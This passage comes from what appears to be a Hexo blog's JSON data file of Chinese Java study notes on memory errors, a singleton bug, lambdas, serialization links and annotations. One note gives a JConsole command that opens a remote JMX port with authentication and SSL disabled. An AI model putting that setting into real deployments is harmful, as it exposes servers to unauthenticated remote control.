HashMap();</span><br><span class=\"line\">        while (true)&#123;</span><br><span class=\"line\">            map.put(System.currentTimeMillis(),map);</span><br><span class=\"line\">            System.out.println(System.currentTimeMillis());</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Thread.sleep(1);</span><br><span class=\"line\">            &#125; catch (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>When you start JVM you define how much RAM it can use use for processing. JVM divides this into certain memory locations for its processing purpose, two of those are Stack &amp; Heap</p>\n<p>OutOfMemoryError is related to Heap. If you have large objects (or) referenced objects in memory, then you will see OutofMemoryError. If you have strong references to objects, then GC can’t clean the memory space allocated for that object. When JVM tries to allocate memory for new object and not enough space available it throws OutofMemoryError because it can’t allocate required amount of memory.</p>\n<p>How to avoid: Make sure un-necessary objects are available for GC</p>\n<p>StackOverflowError is related to stack. All your local variables and methods calls related data will be on stack. For every method call one stack frame will be created and local as well as method call related data will be placed inside the stack frame. Once method execution is completed, stack frame will be removed. ONE WAY to reproduce this is, have infinite loop for method call, you will see stackoverflow error, because stack frame will be populated with method data for every call but it won’t be freed (removed).</p>\n<p>How to avoid: Make sure method calls are ending (not in infinite loop)</p>\n"},{"title":"Jconsle远程配置","date":"2018-07-10T13:09:19.000Z","_content":"    java -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.port=xxxx\"\r\n","source":"_posts/Java/Jconsle远程配置.md","raw":"---\ntitle: Jconsle远程配置\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n    java -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.port=xxxx\"\r\n","slug":"Java/Jconsle远程配置","published":1,"updated":"2018-07-10T13:10:09.895Z","_id":"cjjedmh9p00340gtj3psv84cl","comments":1,"layout":"post","photos":[],"link":"","content":"<pre><code>java -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.port=xxxx&quot;\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<pre><code>java -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.port=xxxx&quot;\n</code></pre>"},{"title":"单例模式不单例","date":"2018-07-10T13:09:19.000Z","_content":"#### 一个最简单的单例：\n```\npublic class Singleton {  \n    private Singleton() {}  \n    private static Singleton single=null;  \n    //静态工厂方法   \n    public static Singleton getInstance() {  \n         if (single == null) {    \n         \n         \n             return new Singleton();  \n             \n             \n             \n         }    \n        return single;  \n    }  \n}  \n```\n#### 错误原因：\n```\n    if (single == null) {    \n         \n             return new Singleton();  \n             \n         }  \n\n```\n这个地方直接return了一个实例\n\n虽然判断了属性中的单例是不是为空\n\n但是实例化后没有赋值给属性单例\n\n所以一直为空，每次都会去实例化一个新的\n\n这样就不是单例了\n#### 改正\n```\npublic class Singleton {  \n    private Singleton() {}  \n    private static Singleton single=null;  \n    //静态工厂方法   \n    public static Singleton getInstance() {  \n         if (single == null) {    \n             single = new Singleton();  \n         }    \n        return single;  \n    }  \n}  \n```\n实例化然后赋值给属性就可以了。","source":"_posts/Java/单例模式不单例.md","raw":"---\ntitle: 单例模式不单例\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n#### 一个最简单的单例：\n```\npublic class Singleton {  \n    private Singleton() {}  \n    private static Singleton single=null;  \n    //静态工厂方法   \n    public static Singleton getInstance() {  \n         if (single == null) {    \n         \n         \n             return new Singleton();  \n             \n             \n             \n         }    \n        return single;  \n    }  \n}  \n```\n#### 错误原因：\n```\n    if (single == null) {    \n         \n             return new Singleton();  \n             \n         }  \n\n```\n这个地方直接return了一个实例\n\n虽然判断了属性中的单例是不是为空\n\n但是实例化后没有赋值给属性单例\n\n所以一直为空，每次都会去实例化一个新的\n\n这样就不是单例了\n#### 改正\n```\npublic class Singleton {  \n    private Singleton() {}  \n    private static Singleton single=null;  \n    //静态工厂方法   \n    public static Singleton getInstance() {  \n         if (single == null) {    \n             single = new Singleton();  \n         }    \n        return single;  \n    }  \n}  \n```\n实例化然后赋值给属性就可以了。","slug":"Java/单例模式不单例","published":1,"updated":"2018-07-10T13:10:09.900Z","_id":"cjjedmh9q00360gtj5iubzgs9","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"一个最简单的单例：\"><a href=\"#一个最简单的单例：\" class=\"headerlink\" title=\"一个最简单的单例：\"></a>一个最简单的单例：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Singleton &#123;  </span><br><span class=\"line\">    private Singleton() &#123;&#125;  </span><br><span class=\"line\">    private static Singleton single=null;  </span><br><span class=\"line\">    //静态工厂方法   </span><br><span class=\"line\">    public static Singleton getInstance() &#123;  </span><br><span class=\"line\">         if (single == null) &#123;    </span><br><span class=\"line\">         </span><br><span class=\"line\">         </span><br><span class=\"line\">             return new Singleton();  </span><br><span class=\"line\">             </span><br><span class=\"line\">             </span><br><span class=\"line\">             </span><br><span class=\"line\">         &#125;    </span><br><span class=\"line\">        return single;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"错误原因：\"><a href=\"#错误原因：\" class=\"headerlink\" title=\"错误原因：\"></a>错误原因：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (single == null) &#123;    </span><br><span class=\"line\">     </span><br><span class=\"line\">         return new Singleton();  </span><br><span class=\"line\">         </span><br><span class=\"line\">     &#125;</span><br></pre></td></tr></table></figure>\n<p>这个地方直接return了一个实例</p>\n<p>虽然判断了属性中的单例是不是为空</p>\n<p>但是实例化后没有赋值给属性单例</p>\n<p>所以一直为空，每次都会去实例化一个新的</p>\n<p>这样就不是单例了</p>\n<h4 id=\"改正\"><a href=\"#改正\" class=\"headerlink\" title=\"改正\"></a>改正</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Singleton &#123;  </span><br><span class=\"line\">    private Singleton() &#123;&#125;  </span><br><span class=\"line\">    private static Singleton single=null;  </span><br><span class=\"line\">    //静态工厂方法   </span><br><span class=\"line\">    public static Singleton getInstance() &#123;  </span><br><span class=\"line\">         if (single == null) &#123;    </span><br><span class=\"line\">             single = new Singleton();  </span><br><span class=\"line\">         &#125;    </span><br><span class=\"line\">        return single;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>实例化然后赋值给属性就可以了。</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"一个最简单的单例：\"><a href=\"#一个最简单的单例：\" class=\"headerlink\" title=\"一个最简单的单例：\"></a>一个最简单的单例：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Singleton &#123;  </span><br><span class=\"line\">    private Singleton() &#123;&#125;  </span><br><span class=\"line\">    private static Singleton single=null;  </span><br><span class=\"line\">    //静态工厂方法   </span><br><span class=\"line\">    public static Singleton getInstance() &#123;  </span><br><span class=\"line\">         if (single == null) &#123;    </span><br><span class=\"line\">         </span><br><span class=\"line\">         </span><br><span class=\"line\">             return new Singleton();  </span><br><span class=\"line\">             </span><br><span class=\"line\">             </span><br><span class=\"line\">             </span><br><span class=\"line\">         &#125;    </span><br><span class=\"line\">        return single;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"错误原因：\"><a href=\"#错误原因：\" class=\"headerlink\" title=\"错误原因：\"></a>错误原因：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (single == null) &#123;    </span><br><span class=\"line\">     </span><br><span class=\"line\">         return new Singleton();  </span><br><span class=\"line\">         </span><br><span class=\"line\">     &#125;</span><br></pre></td></tr></table></figure>\n<p>这个地方直接return了一个实例</p>\n<p>虽然判断了属性中的单例是不是为空</p>\n<p>但是实例化后没有赋值给属性单例</p>\n<p>所以一直为空，每次都会去实例化一个新的</p>\n<p>这样就不是单例了</p>\n<h4 id=\"改正\"><a href=\"#改正\" class=\"headerlink\" title=\"改正\"></a>改正</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Singleton &#123;  </span><br><span class=\"line\">    private Singleton() &#123;&#125;  </span><br><span class=\"line\">    private static Singleton single=null;  </span><br><span class=\"line\">    //静态工厂方法   </span><br><span class=\"line\">    public static Singleton getInstance() &#123;  </span><br><span class=\"line\">         if (single == null) &#123;    </span><br><span class=\"line\">             single = new Singleton();  </span><br><span class=\"line\">         &#125;    </span><br><span class=\"line\">        return single;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>实例化然后赋值给属性就可以了。</p>\n"},{"title":"lambda","date":"2018-07-10T13:09:19.000Z","_content":"遍历集合\n```\nkeySet.forEach((key) -> {System.out.println(userinfoMap.get(key));});\n```","source":"_posts/Java/lambda.md","raw":"---\ntitle: lambda\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n遍历集合\n```\nkeySet.forEach((key) -> {System.out.println(userinfoMap.get(key));});\n```","slug":"Java/lambda","published":1,"updated":"2018-07-10T13:10:09.897Z","_id":"cjjedmh9r00380gtjd93jn9j1","comments":1,"layout":"post","photos":[],"link":"","content":"<p>遍历集合<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">keySet.forEach((key) -&gt; &#123;System.out.println(userinfoMap.get(key));&#125;);</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>遍历集合<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">keySet.forEach((key) -&gt; &#123;System.out.println(userinfoMap.get(key));&#125;);</span><br></pre></td></tr></table></figure></p>\n"},{"title":"序列化","date":"2018-07-10T13:09:19.000Z","_content":"[Java 序列化](http://www.runoob.com/java/java-serialization.html)\n\n[Java 序列化的高级认识](https://www.ibm.com/developerworks/cn/java/j-lo-serial/index.html)","source":"_posts/Java/序列化.md","raw":"---\ntitle: 序列化\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n[Java 序列化](http://www.runoob.com/java/java-serialization.html)\n\n[Java 序列化的高级认识](https://www.ibm.com/developerworks/cn/java/j-lo-serial/index.html)","slug":"Java/序列化","published":1,"updated":"2018-07-10T13:10:09.901Z","_id":"cjjedmh9s003a0gtjne5jv8xh","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://www.runoob.com/java/java-serialization.html\" target=\"_blank\" rel=\"noopener\">Java 序列化</a></p>\n<p><a href=\"https://www.ibm.com/developerworks/cn/java/j-lo-serial/index.html\" target=\"_blank\" rel=\"noopener\">Java 序列化的高级认识</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://www.runoob.com/java/java-serialization.html\" target=\"_blank\" rel=\"noopener\">Java 序列化</a></p>\n<p><a href=\"https://www.ibm.com/developerworks/cn/java/j-lo-serial/index.html\" target=\"_blank\" rel=\"noopener\">Java 序列化的高级认识</a></p>\n"},{"title":"文件增量读写","date":"2018-07-10T13:09:19.000Z","_content":"用RandomAccessFile","source":"_posts/Java/文件增量读写.md","raw":"---\ntitle: 文件增量读写\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n用RandomAccessFile","slug":"Java/文件增量读写","published":1,"updated":"2018-07-10T13:10:09.902Z","_id":"cjjedmh9t003c0gtjjuyvncox","comments":1,"layout":"post","photos":[],"link":"","content":"<p>用RandomAccessFile</p>\n","site":{"data":{}},"excerpt":"","more":"<p>用RandomAccessFile</p>\n"},{"title":"注解","date":"2018-07-10T13:09:19.000Z","_content":"### 注解是什么\n注解是描述Java代码的代码，它能够被编译器解析，注解处理工具在运行时也能够解析注解。用来标识代码，提供额外的信息做特殊处理。\n比如：\n```\n    @Override\n    public String toString(){\n        return \"\";\n    }\n```\n@Override 是一个常用的注解，它标识我们重写了某个方法。\n\n### 注解的作用\n\n还是@Override注解，Ctrl+左键点击，查看源代码。\n```\npackage java.lang;\nimport java.lang.annotation.*;\n\n/**\n * Indicates that a method declaration is intended to override a\n * method declaration in a supertype. If a method is annotated with\n * this annotation type compilers are required to generate an error\n * message unless at least one of the following conditions hold:\n *\n * <ul><li>\n * The method does override or implement a method declared in a\n * supertype.\n * </li><li>\n * The method has a signature that is override-equivalent to that of\n * any public method declared in {@linkplain Object}.\n * </li></ul>\n *\n * @author  Peter von der Ah&eacute;\n * @author  Joshua Bloch\n * @jls 9.6.1.4 @Override\n * @since 1.5\n */\n@Target(ElementType.METHOD)\n@Retention(RetentionPolicy.SOURCE)\npublic @interface Override {\n}\n```\n注释的大致意思是当一个方法被这个注解标记的时候要满足：\n\n*实现了或者重写了父类的方法*\n\n*实现或者重写了Object类的方法*\n\n### Java提供的注解\n>  @SuppressWarnings()\n>\n>   @Property\n>    \n>    @Ignore\n>   \n>    @Deprecated\n> \n>...\n\n- ##### 元注解\n在@override的源码中有\n```\n@Target(ElementType.METHOD)\n@Retention(RetentionPolicy.SOURCE)\npublic @interface Override {\n}\n```\n@Target和@Retention是元注解。元注解即用来描述注解的注解，只能应用于对方法进行注解。\n##### 在JDK源码中注解包内容如图\n\n![image](C:\\Users\\Hanke_000\\Desktop\\1.jpg)\n\n##### 类之间的关系如图\n\n![image](C:\\Users\\Hanke_000\\Desktop\\diagram.png)\n@Document、@Target、@Retention和@inherrited是元注解\n\n##### 元注解的作用\n1. Documented\n当一个注解类型被@Documented元注解所描述时，那么无论在哪里使用这个注解，都会被Javadoc工具文档化\n\n2. Inherited型是自动继承的。具体解释如下：若一个注解类型被Inherited元注解所修饰，则当用户在一个类声明中查询该注解类型时，若发现这个类声明中不包含这个注解类型，则会自动在这个类的父类中查询相应的注解类型，这个过程会被重复，直到该注解类型被找到或是查找完了Object类还未找到\n3. Retention\n我们在上面已经见到个这个元注解，它表示一个注解类型会被保留到什么时候\n4. Target\n这个元注解说明了被修饰的注解的应用范围，也就是被修饰的注解可以用来注解哪些程序元素.\n\n### 自定义注解\n\n1. 注解类型通过”@interface“关键字定义的\n2. 在”注解体“中，所有的方法均没有方法体且只允许public和abstract这两种修饰符号（不加修饰符缺省为public），注解方法不允许有throws子句；\n3. 注解方法的返回值只能为以下几种：原始数据类型）, String, Class, 枚举类型, 注解和它们的一维数组，可以为方法指定默认返回值。\n\n下面是一个自定义的注解\n```\n@Target({TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE})\n@Retention(RetentionPolicy.SOURCE)\npublic @interface myAnnotation {\n    String[] value();\n```\n\n### 注解的应用\n- 生成文档。这是最常见的，也是Java 最早提供的注解。常用的有@see @param @return 等\n- 跟踪代码依赖性，实现替代配置文件功能。比较常见的是spring 2.5 开始的基于注解配置。作用就是减少配置。现在的框架基本都使用了这种配置来减少配置文件的数量。以后java的程序开发，最多的也将实现注解配置，具有很大用处\n- 在编译时进行格式检查。如@override 放在方法前，如果你这个方法并不是覆盖了超类方法，则编译时就能检查出。\n- 标记业务类，执行业务方法\n- \n\n[javaAPI](http://docs.oracle.com/javase/7/docs/api/)\n\n[理解](http://www.importnew.com/10294.html)\n\n[使用场景1](http://blog.csdn.net/beyond0851/article/details/8520993)\n\n[使用场景2](http://www.cnblogs.com/yanbincn/archive/2012/06/19/2554318.html)\n\n[java中注解获取](http://www.importnew.com/23816.html)\n\n[Spring获取注解](http://fanyc.iteye.com/blog/2224809)\n\n[Spring注解大全](https://www.ibm.com/developerworks/cn/opensource/os-cn-spring-iocannt/)\n\n[获取自定义注解](http://snv.iteye.com/blog/2277054)\n\n[Spring注解获取](http://www.itwendao.com/article/detail/315485.html)","source":"_posts/Java/注解.md","raw":"---\ntitle: 注解\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n### 注解是什么\n注解是描述Java代码的代码，它能够被编译器解析，注解处理工具在运行时也能够解析注解。用来标识代码，提供额外的信息做特殊处理。\n比如：\n```\n    @Override\n    public String toString(){\n        return \"\";\n    }\n```\n@Override 是一个常用的注解，它标识我们重写了某个方法。\n\n### 注解的作用\n\n还是@Override注解，Ctrl+左键点击，查看源代码。\n```\npackage java.lang;\nimport java.lang.annotation.*;\n\n/**\n * Indicates that a method declaration is intended to override a\n * method declaration in a supertype. If a method is annotated with\n * this annotation type compilers are required to generate an error\n * message unless at least one of the following conditions hold:\n *\n * <ul><li>\n * The method does override or implement a method declared in a\n * supertype.\n * </li><li>\n * The method has a signature that is override-equivalent to that of\n * any public method declared in {@linkplain Object}.\n * </li></ul>\n *\n * @author  Peter von der Ah&eacute;\n * @author  Joshua Bloch\n * @jls 9.6.1.4 @Override\n * @since 1.5\n */\n@Target(ElementType.METHOD)\n@Retention(RetentionPolicy.SOURCE)\npublic @interface Override {\n}\n```\n注释的大致意思是当一个方法被这个注解标记的时候要满足：\n\n*实现了或者重写了父类的方法*\n\n*实现或者重写了Object类的方法*\n\n### Java提供的注解\n>  @SuppressWarnings()\n>\n>   @Property\n>    \n>    @Ignore\n>   \n>    @Deprecated\n> \n>...\n\n- ##### 元注解\n在@override的源码中有\n```\n@Target(ElementType.METHOD)\n@Retention(RetentionPolicy.SOURCE)\npublic @interface Override {\n}\n```\n@Target和@Retention是元注解。元注解即用来描述注解的注解，只能应用于对方法进行注解。\n##### 在JDK源码中注解包内容如图\n\n![image](C:\\Users\\Hanke_000\\Desktop\\1.jpg)\n\n##### 类之间的关系如图\n\n![image](C:\\Users\\Hanke_000\\Desktop\\diagram.png)\n@Document、@Target、@Retention和@inherrited是元注解\n\n##### 元注解的作用\n1. Documented\n当一个注解类型被@Documented元注解所描述时，那么无论在哪里使用这个注解，都会被Javadoc工具文档化\n\n2. Inherited型是自动继承的。具体解释如下：若一个注解类型被Inherited元注解所修饰，则当用户在一个类声明中查询该注解类型时，若发现这个类声明中不包含这个注解类型，则会自动在这个类的父类中查询相应的注解类型，这个过程会被重复，直到该注解类型被找到或是查找完了Object类还未找到\n3. Retention\n我们在上面已经见到个这个元注解，它表示一个注解类型会被保留到什么时候\n4. Target\n这个元注解说明了被修饰的注解的应用范围，也就是被修饰的注解可以用来注解哪些程序元素.\n\n### 自定义注解\n\n1. 注解类型通过”@interface“关键字定义的\n2. 在”注解体“中，所有的方法均没有方法体且只允许public和abstract这两种修饰符号（不加修饰符缺省为public），注解方法不允许有throws子句；\n3. 注解方法的返回值只能为以下几种：原始数据类型）, String, Class, 枚举类型, 注解和它们的一维数组，可以为方法指定默认返回值。\n\n下面是一个自定义的注解\n```\n@Target({TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE})\n@Retention(RetentionPolicy.SOURCE)\npublic @interface myAnnotation {\n    String[] value();\n```\n\n### 注解的应用\n- 生成文档。这是最常见的，也是Java 最早提供的注解。常用的有@see @param @return 等\n- 跟踪代码依赖性，实现替代配置文件功能。比较常见的是spring 2.5 开始的基于注解配置。作用就是减少配置。现在的框架基本都使用了这种配置来减少配置文件的数量。以后java的程序开发，最多的也将实现注解配置，具有很大用处\n- 在编译时进行格式检查。如@override 放在方法前，如果你这个方法并不是覆盖了超类方法，则编译时就能检查出。\n- 标记业务类，执行业务方法\n- \n\n[javaAPI](http://docs.oracle.com/javase/7/docs/api/)\n\n[理解](http://www.importnew.com/10294.html)\n\n[使用场景1](http://blog.csdn.net/beyond0851/article/details/8520993)\n\n[使用场景2](http://www.cnblogs.com/yanbincn/archive/2012/06/19/2554318.html)\n\n[java中注解获取](http://www.importnew.com/23816.html)\n\n[Spring获取注解](http://fanyc.iteye.com/blog/2224809)\n\n[Spring注解大全](https://www.ibm.com/developerworks/cn/opensource/os-cn-spring-iocannt/)\n\n[获取自定义注解](http://snv.iteye.com/blog/2277054)\n\n[Spring注解获取](http://www.itwendao.com/article/detail/315485.html)","slug":"Java/注解","published":1,"updated":"2018-07-10T13:10:09.903Z","_id":"cjjedmh9u003e0gtjdf8pptjq","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"注解是什么\"><a href=\"#注解是什么\" class=\"headerlink\" title=\"注解是什么\"></a>注解是什么</h3><p>注解是描述Java代码的代码，它能够被编译器解析，注解处理工具在运行时也能够解析注解。用来标识代码，提供额外的信息做特殊处理。<br>比如：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Override</span><br><span class=\"line\">public String toString()&#123;</span><br><span class=\"line\">    return &quot;&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>@Override 是一个常用的注解，它标识我们重写了某个方法。</p>\n<h3 id=\"注解的作用\"><a href=\"#注解的作用\" class=\"headerlink\" title=\"注解的作用\"></a>注解的作用</h3><p>还是@Override注解，Ctrl+左键点击，查看源代码。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package java.lang;</span><br><span class=\"line\">import java.lang.annotation.*;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Indicates that a method declaration is intended to override a</span><br><span class=\"line\"> * method declaration in a supertype. If a method is annotated with</span><br><span class=\"line\"> * this annotation type compilers are required to generate an error</span><br><span class=\"line\"> * message unless at least one of the following conditions hold:</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * &lt;ul&gt;&lt;li&gt;</span><br><span class=\"line\"> * The method does override or implement a method declared in a</span><br><span class=\"line\"> * supertype.</span><br><span class=\"line\"> * &lt;/li&gt;&lt;li&gt;</span><br><span class=\"line\"> * The method has a signature that is override-equivalent to that of</span><br><span class=\"line\"> * any public method declared in &#123;@linkplain Object&#125;.</span><br><span class=\"line\"> * &lt;/li&gt;&lt;/ul&gt;</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @author  Peter von der Ah&amp;eacute;</span><br><span class=\"line\"> * @author  Joshua Bloch</span><br><span class=\"line\"> * @jls 9.6.1.4 @Override</span><br><span class=\"line\"> * @since 1.5</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Target(ElementType.METHOD)</span><br><span class=\"line\">@Retention(RetentionPolicy.SOURCE)</span><br><span class=\"line\">public @interface Override &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>注释的大致意思是当一个方法被这个注解标记的时候要满足：</p>\n<p><em>实现了或者重写了父类的方法</em></p>\n<p><em>实现或者重写了Object类的方法</em></p>\n<h3 id=\"Java提供的注解\"><a href=\"#Java提供的注解\" class=\"headerlink\" title=\"Java提供的注解\"></a>Java提供的注解</h3><blockquote>\n<p> @SuppressWarnings()</p>\n<p>  @Property</p>\n<p>   @Ignore</p>\n<p>   @Deprecated</p>\n<p>…</p>\n</blockquote>\n<ul>\n<li><h5 id=\"元注解\"><a href=\"#元注解\" class=\"headerlink\" title=\"元注解\"></a>元注解</h5>在@override的源码中有<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Target(ElementType.METHOD)</span><br><span class=\"line\">@Retention(RetentionPolicy.SOURCE)</span><br><span class=\"line\">public @interface Override &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>@Target和@Retention是元注解。元注解即用来描述注解的注解，只能应用于对方法进行注解。</p>\n<h5 id=\"在JDK源码中注解包内容如图\"><a href=\"#在JDK源码中注解包内容如图\" class=\"headerlink\" title=\"在JDK源码中注解包内容如图\"></a>在JDK源码中注解包内容如图</h5><p><img src=\"C:\\Users\\Hanke_000\\Desktop\\1.jpg\" alt=\"image\"></p>\n<h5 id=\"类之间的关系如图\"><a href=\"#类之间的关系如图\" class=\"headerlink\" title=\"类之间的关系如图\"></a>类之间的关系如图</h5><p><img src=\"C:\\Users\\Hanke_000\\Desktop\\diagram.png\" alt=\"image\"><br>@Document、@Target、@Retention和@inherrited是元注解</p>\n<h5 id=\"元注解的作用\"><a href=\"#元注解的作用\" class=\"headerlink\" title=\"元注解的作用\"></a>元注解的作用</h5><ol>\n<li><p>Documented<br>当一个注解类型被@Documented元注解所描述时，那么无论在哪里使用这个注解，都会被Javadoc工具文档化</p>\n</li>\n<li><p>Inherited型是自动继承的。具体解释如下：若一个注解类型被Inherited元注解所修饰，则当用户在一个类声明中查询该注解类型时，若发现这个类声明中不包含这个注解类型，则会自动在这个类的父类中查询相应的注解类型，这个过程会被重复，直到该注解类型被找到或是查找完了Object类还未找到</p>\n</li>\n<li>Retention<br>我们在上面已经见到个这个元注解，它表示一个注解类型会被保留到什么时候</li>\n<li>Target<br>这个元注解说明了被修饰的注解的应用范围，也就是被修饰的注解可以用来注解哪些程序元素.</li>\n</ol>\n<h3 id=\"自定义注解\"><a href=\"#自定义注解\" class=\"headerlink\" title=\"自定义注解\"></a>自定义注解</h3><ol>\n<li>注解类型通过”@interface“关键字定义的</li>\n<li>在”注解体“中，所有的方法均没有方法体且只允许public和abstract这两种修饰符号（不加修饰符缺省为public），注解方法不允许有throws子句；</li>\n<li>注解方法的返回值只能为以下几种：原始数据类型）, String, Class, 枚举类型, 注解和它们的一维数组，可以为方法指定默认返回值。</li>\n</ol>\n<p>下面是一个自定义的注解<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Target(&#123;TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE&#125;)</span><br><span class=\"line\">@Retention(RetentionPolicy.SOURCE)</span><br><span class=\"line\">public @interface myAnnotation &#123;</span><br><span class=\"line\">    String[] value();</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"注解的应用\"><a href=\"#注解的应用\" class=\"headerlink\" title=\"注解的应用\"></a>注解的应用</h3><ul>\n<li>生成文档。这是最常见的，也是Java 最早提供的注解。常用的有@see @param @return 等</li>\n<li>跟踪代码依赖性，实现替代配置文件功能。比较常见的是spring 2.5 开始的基于注解配置。作用就是减少配置。现在的框架基本都使用了这种配置来减少配置文件的数量。以后java的程序开发，最多的也将实现注解配置，具有很大用处</li>\n<li>在编译时进行格式检查。如@override 